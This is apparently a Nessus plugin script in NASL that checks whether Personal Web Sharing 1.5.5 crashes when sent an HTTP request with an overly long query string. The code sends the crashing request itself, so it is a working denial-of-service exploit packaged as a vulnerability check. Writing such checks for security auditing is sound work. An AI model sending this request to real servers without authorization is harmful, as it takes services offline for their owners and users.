#
# This script was written by Michel Arboi <arboi@alussinan.org>
#
# Script audit and contributions from Carmichael Security <http://www.carmichaelsecurity.com>
#      Erik Anderson <eanders@carmichaelsecurity.com>
#      
#
# GPL
# *untested*
#
# References:
# To: BUGTRAQ@SECURITYFOCUS.COM
# Subject: Personal Web Sharing remote stop
# Date: Thu, 10 May 2001 07:32:43 +0200 (EET)
# Frok: "Jass Seljamaa" <jass@email.isp.ee>
#
# Affected:
# Personal Web sharing v1.5.5
# 


if(description)
{
 script_id(11085);
 script_bugtraq_id(2715, 84);
 script_version ("$Revision: 1.12 $");
 name["english"] = "Personal Web Sharing overflow ";
 script_name(english:name["english"]);
 
 desc["english"] = "
It was possible to kill the Personal Web Sharing
service by sending it a too long request.

A cracker may exploit this vulnerability to make your web server
crash continually.

Solution : upgrade your software or protect it with a filtering reverse proxy

Risk factor : High";

 script_description(english:desc["english"]);
 
 summary["english"] = "Too long request kills PWS";
 script_summary(english:summary["english"]);
 
 script_category(ACT_DENIAL);
 
 script_copyright(english:"This script is Copyright (C) 2002 Michel Arboi");
 family["english"] = "Denial of Service";
 script_family(english:family["english"]);
 script_require_ports("Services/www", 80);
 script_dependencie("find_service.nes", "httpver.nasl", "http_version.nasl");
 exit(0);
}

########

include("http_func.inc");



port = get_http_port(default:80);

if(! get_port_state(port)) exit(0);

if (http_is_dead(port: port)) exit(0);

soc = http_open_socket(port);
if(! soc) exit(0);

r= http_get(item:string("/?", crap(6100)), port:port);
send(socket:soc, data: r);
r = http_recv(socket:soc);
close(soc);


if(http_is_dead(port: port)) { security_hole(port); }
